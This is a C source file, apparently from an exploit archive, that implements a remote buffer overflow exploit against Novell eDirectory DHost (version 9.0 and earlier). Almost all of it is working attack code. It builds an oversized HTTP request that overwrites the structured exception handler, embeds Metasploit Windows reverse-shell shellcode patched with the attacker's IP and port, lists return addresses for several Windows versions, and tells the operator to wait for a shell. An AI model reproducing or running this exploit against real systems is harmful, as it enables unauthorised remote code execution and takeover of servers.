/*
       _______         ________           .__        _____          __
___  __\   _  \   ____ \_____  \          |  |__    /  |  |   ____ |  | __
\  \/  /  /_\  \ /    \  _(__  <   ______ |  |  \  /   |  |__/ ___\|  |/ /
 >    <\  \_/   \   |  \/       \ /_____/ |   Y  \/    ^   /\  \___|    <
/__/\_ \\_____  /___|  /______  /         |___|  /\____   |  \___  >__|_ \
      \/      \/     \/       \/   30\10\06    \/      |__|      \/     \/
      
 *   mm.           dM8
 *  YMMMb.       dMM8      _____________________________________
 *   YMMMMb     dMMM'     [                                     ]
 *    `YMMMb   dMMMP      [ There are doors I have yet to open  ]
 *      `YMMM  MMM'       [ windows I have yet to look through  ]
 *         "MbdMP         [ Going forward may not be the answer ]
 *     .dMMMMMM.P         [                                     ]
 *    dMM  MMMMMM         [       maybe I should go back        ]
 *    8MMMMMMMMMMI        [_____________________________________]
 *     YMMMMMMMMM                   www.netbunny.org
 *       "MMMMMMP
 *      MxM .mmm
 *      W"W """
 

[i] Title:              Novell eDirectory <= 9.0 DHost Buffer overflow exploit
[i] Discovered by:      Novell
[i] Original code by:   FistFuXXer
[i] Exploit by:         Expanders
[i] Filename:           XHNB-Novell-eDirectory_remote_bof.c
[i] References:         http://www.novell.com/
[i] Greatings:          x0n3-h4ck - netbunny

[ Research diary ]

After a try of FistFuXXer's perl exploit I started to port the code in C and also use a different exploiting
method.  This exploit overwrite the Second Exception Handler to take control of the program flow.

[ Special thanks ]

FistFuXXer
H D Moore

[ Links ]

www.x0n3-h4ck.org
www.netbunny.org

*/

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>

#define BUFFSIZE 1000 // Buffer size
#define DEADRET "\xde\xc0\xad\xde" // this address cause the exception to be called

int banner();
int usage(char *filename);
int inject(char *port, char *ip);
int remote_connect( char* ip, unsigned short port );


char attack[] =
"GET /nds HTTP/1.1\r\n"
"Host: %s\r\n\r\n";

/* win32_reverse -  EXITFUNC=seh Size=312 Encoder=Pex http://metasploit.com */
char shellcode[] =
"\x29\xc9\x83\xe9\xb8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x3f"
"\x61\x88\x6f\x83\xeb\xfc\xe2\xf4\xc3\x0b\x63\x22\xd7\x98\x77\x90"
"\xc0\x01\x03\x03\x1b\x45\x03\x2a\x03\xea\xf4\x6a\x47\x60\x67\xe4"
"\x70\x79\x03\x30\x1f\x60\x63\x26\xb4\x55\x03\x6e\xd1\x50\x48\xf6"
"\x93\xe5\x48\x1b\x38\xa0\x42\x62\x3e\xa3\x63\x9b\x04\x35\xac\x47"
"\x4a\x84\x03\x30\x1b\x60\x63\x09\xb4\x6d\xc3\xe4\x60\x7d\x89\x84"
"\x3c\x4d\x03\xe6\x53\x45\x94\x0e\xfc\x50\x53\x0b\xb4\x22\xb8\xe4"
"\x7f\x6d\x03\x1f\x23\xcc\x03\x2f\x37\x3f\xe0\xe1\x71\x6f\x64\x3f"
"\xc0\xb7\xee\x3c\x59\x09\xbb\x5d\x57\x16\xfb\x5d\x60\x35\x77\xbf"
"\x57\xaa\x65\x93\x04\x31\x77\xb9\x60\xe8\x6d\x09\xbe\x8c\x80\x6d"
"\x6a\x0b\x8a\x90\xef\x09\x51\x66\xca\xcc\xdf\x90\xe9\x32\xdb\x3c"
"\x6c\x22\xdb\x2c\x6c\x9e\x58\x07\x35\x61\x88\x6c\x59\x09\x8c\x69"
"\x59\x32\x01\x8e\xaa\x09\x64\x96\x95\x01\xdf\x90\xe9\x0b\x98\x3e"
"\x6a\x9e\x58\x09\x55\x05\xee\x07\x5c\x0c\xe2\x3f\x66\x48\x44\xe6"
"\xd8\x0b\xcc\xe6\xdd\x50\x48\x9c\x95\xf4\x01\x92\xc1\x23\xa5\x91"
"\x7d\x4d\x05\x15\x07\xca\x23\xc4\x57\x13\x76\xdc\x29\x9e\xfd\x47"
"\xc0\xb7\xd3\x38\x6d\x30\xd9\x3e\x55\x60\xd9\x3e\x6a\x30\x77\xbf"
"\x57\xcc\x51\x6a\xf1\x32\x77\xb9\x55\x9e\x77\x58\xc0\xb1\xe0\x88"
"\x46\xa7\xf1\x90\x4a\x65\x77\xb9\xc0\x16\x74\x90\xef\x09\x78\xe5"
"\x3b\x3e\xdb\x90\xe9\x9e\x58\x6f";

char jmpback[]=
//22 byte xor decoder (0x55)
"\xEB\x0F\x5B\x33\xC9\x66\x83\xE9\xE0\x80\x33\x55\x43\xE2\xFA\xEB\x05\xE8\xEC\xFF\xFF\xFF"
//(20 byte jump-back code -> 256 + 256 + 64 bytes)
"\x8C\xBB\x8C\x21\x71\xA1\x0C\xD5\x94\x5F\xC5\xAB\x98\xAB\x98\xD5\xBC\x15\xAA\xB4";

char jmpover[]=
// 2 bytes jump 6 bytes over - 2 bytes NOP
"\xEb\x06\x90\x90";

struct retcodes{char *platform;unsigned long addr;} targets[]= {
        { "eDirectory MFC42U.dll", 0x5f80bbf7 },
        { "Windows NT SP 5/6"    , 0x776a1082 },   // ws2help.dll pop esi, pop ebx, retn  [Tnx to metasploit]
	{ "Windows 2k Universal" , 0x750211a9 },   // ws2help.dll pop ebp, pop ebx, retn  [Tnx to metasploit]
	{ "Windows XP Universal" , 0x71abe325 },   // ws2help.dll pop ebx, pop ebp, retn  [Tnx to metasploit]
	{ NULL }
};
int banner() {
  printf("\n       _______         ________           .__        _____          __     \n");
  printf("___  __\\   _  \\   ____ \\_____  \\          |  |__    /  |  |   ____ |  | __ \n");
  printf("\\  \\/  /  /_\\  \\ /    \\  _(__  <   ______ |  |  \\  /   |  |__/ ___\\|  |/ / \n");
  printf(" >    <\\  \\_/   \\   |  \\/       \\ /_____/ |   Y  \\/    ^   /\\  \\___|    <  \n");
  printf("/__/\\_ \\\\_____  /___|  /______  /         |___|  /\\____   |  \\___  >__|_ \\ \n");
  printf("      \\/      \\/     \\/       \\/               \\/      |__|      \\/     \\/ \n\n");
  printf("[i] Title:        \tNovell eDirectory DHost Buffer overflow\n");
  printf("[i] Perl Code by:\tFistFuXXer\n");
  printf("[i] Exploit by:   \tExpanders\n\n");
  return 0;
}

int usage(char *filename) {
  int i;
  printf("Usage: \t%s <host> <port> <l_ip> <l_port> <targ>\n\n",filename);
  printf("       \t<host>   : Victim's host\n");
  printf("       \t<port>   : Victim's port  ::  Default: 8028\n");
  printf("       \t<l_ip>   : Local ip address for connectback\n");
  printf("       \t<l_port> : Local port for connectback\n");
  printf("       \t<targ>   : Target from the list below\n\n");
  
  printf("#   \t Platform\n");
  printf("-----------------------------------------------\n");
  for(i = 0; targets[i].platform; i++)
        printf("%d \t %s\n",i,targets[i].platform);
  printf("-----------------------------------------------\n");
  exit(0);
}

int inject(char *port, char *ip)
{
    unsigned long xorip;
    unsigned short xorport;
    xorip = inet_addr(ip)^(unsigned long)0x6F88613F;
    xorport = htons(atoi( port ))^(unsigned short)0x6F88;
    memcpy ( &shellcode[184], &xorip, 4);
    memcpy ( &shellcode[190], &xorport, 2);
    return 0;
}

int remote_connect( char* ip, unsigned short port )
{
  int s;
  struct sockaddr_in remote_addr;
  struct hostent* host_addr;

  memset ( &remote_addr, 0x0, sizeof ( remote_addr ) );
  if ( ( host_addr = gethostbyname ( ip ) ) == NULL )
  {
   printf ( "[X] Cannot resolve \"%s\"\n", ip );
   exit ( 1 );
  }
  remote_addr.sin_family = AF_INET;
  remote_addr.sin_port = htons ( port );
  remote_addr.sin_addr = * ( ( struct in_addr * ) host_addr->h_addr );
  if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
  {
   printf ( "[X] Socket failed!\n" );
   exit ( 1 );
  }
  if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
  {
   printf ( "[X] Failed connecting!\n" );
   exit ( 1 );
  }
  return ( s );
}

int main(int argc, char *argv[]) {
    int s,position;
    unsigned int rcv;
    char *buffer,*request;
    char recvbuf[256];
    banner();
    if( (argc != 6) || (atoi(argv[2]) < 1) || (atoi(argv[2]) > 65534) )
        usage(argv[0]);
    position = 0;
    printf("[+] Creating evil buffer\n");
    buffer = (char *) malloc(BUFFSIZE);
    request = (char *) malloc(BUFFSIZE + strlen(attack)); //  +3 == \r + \n + 0x00
    memset(buffer,0x90,BUFFSIZE);  // Fill with nops

    inject(argv[4],argv[3]);     // Xor port and ip and put them into the shellcode
    memset(buffer,0x41,68);      // First comes the ascii
    position = 68;
    memcpy(buffer+position,DEADRET,4);
    position = 680 - (strlen(shellcode) + 100);   // 680 : Pointer to next Execption structure
    memcpy(buffer+position,shellcode,strlen(shellcode));
    position += strlen(shellcode)+100;
    memcpy(buffer+position,jmpover,4); position += 4;
    memcpy(buffer+position,&targets[atoi(argv[5])].addr,4); position += 4;
    position += 8; // 8 bytes more nops
    memcpy(buffer+position,jmpback,strlen(jmpback)); position += strlen(jmpback);
    position += 8; // 8 bytes more nops
    memset(buffer+position,0x00,1); // End


    sprintf(request,attack,buffer);
    printf("[+] Connecting to remote host\n");
    s = remote_connect(argv[1],atoi(argv[2]));
    sleep(1);
    printf("[+] Sending %d bytes of painfull buffer\n",strlen(buffer));
    if ( send ( s, request, strlen (request), 0) <= 0 )
    {
           printf("[X] Failed to send buffer\n");
           exit ( 1 );
    }
    printf("[+] Done - Wait for shell on port %s\n",argv[4]);
    close(s);
    free(buffer);
    buffer = NULL;
    return 0;
}
